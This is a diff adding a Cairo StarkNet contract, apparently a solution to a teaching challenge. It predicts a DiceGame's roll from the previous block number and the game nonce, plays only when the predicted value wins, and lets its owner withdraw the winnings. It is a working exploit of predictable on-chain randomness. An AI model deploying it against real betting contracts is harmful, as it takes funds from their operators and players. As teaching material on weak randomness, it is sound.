@@ -1,0 +1,92 @@
+use starknet::ContractAddress;
+
+#[starknet::interface]
+pub trait IRiggedRoll<T> {
+    fn rigged_roll(ref self: T);
+    fn withdraw(ref self: T, to: ContractAddress, amount: u256);
+    fn last_dice_value(self: @T) -> u256;
+    fn predicted_roll(self: @T) -> u256;
+    fn predict_roll(ref self: T);
+}
+
+#[starknet::contract]
+mod RiggedRoll {
+    use openzeppelin::token::erc20::interface::IERC20CamelDispatcherTrait;
+    use contracts::DiceGame::IDiceGameDispatcherTrait;
+    use contracts::DiceGame::IDiceGameDispatcher;
+    use starknet::{ContractAddress, get_contract_address, get_block_number};
+    use keccak::keccak_u256s_le_inputs;
+    use super::IRiggedRoll;
+    use openzeppelin::access::ownable::OwnableComponent;
+
+    component!(path: OwnableComponent, storage: ownable, event: OwnableEvent);
+
+    #[abi(embed_v0)]
+    impl OwnableImpl = OwnableComponent::OwnableImpl<ContractState>;
+
+    impl OwnableInternalImpl = OwnableComponent::InternalImpl<ContractState>;
+
+    #[storage]
+    struct Storage {
+        dice_game: IDiceGameDispatcher,
+        #[substorage(v0)]
+        ownable: OwnableComponent::Storage,
+        predicted_roll: u256
+    }
+
+    #[event]
+    #[derive(Drop, starknet::Event)]
+    enum Event {
+        #[flat]
+        OwnableEvent: OwnableComponent::Event
+    }
+
+    #[constructor]
+    fn constructor(
+        ref self: ContractState, dice_game_address: ContractAddress, owner: ContractAddress
+    ) {
+        self.dice_game.write(IDiceGameDispatcher { contract_address: dice_game_address });
+        self.ownable.initializer(owner);
+    }
+
+    #[abi(embed_v0)]
+    impl RiggedRollImpl of super::IRiggedRoll<ContractState> {
+        fn rigged_roll(ref self: ContractState) {
+            let predicted_roll = self.predicted_roll.read();
+            if (predicted_roll <= 5) {
+                self.dice_game.read().roll_dice(2000000000000000);
+            } else {
+                assert(false, 'Predicted roll was too high');
+            }
+        }
+        fn withdraw(ref self: ContractState, to: ContractAddress, amount: u256) {
+            self.ownable.assert_only_owner();
+            let contract_balance = self
+                .dice_game
+                .read()
+                .eth_token()
+                .balanceOf(get_contract_address());
+            assert(contract_balance >= amount, 'Insufficient balance');
+            self.dice_game.read().eth_token().transfer(to, amount);
+        }
+        fn last_dice_value(self: @ContractState) -> u256 {
+            self.dice_game.read().last_dice_value()
+        }
+        fn predicted_roll(self: @ContractState) -> u256 {
+            self.predicted_roll.read()
+        }
+        fn predict_roll(ref self: ContractState) {
+            let contract_balance = self
+                .dice_game
+                .read()
+                .eth_token()
+                .balanceOf(get_contract_address());
+            assert(contract_balance >= 2000000000000000, 'Not enough ETH');
+
+            let prev_block: u256 = get_block_number().into() - 1;
+            let array = array![prev_block, self.dice_game.read().nonce()];
+            let predicted_roll = keccak_u256s_le_inputs(array.span()) % 16;
+            self.predicted_roll.write(predicted_roll);
+        }
+    }
+}
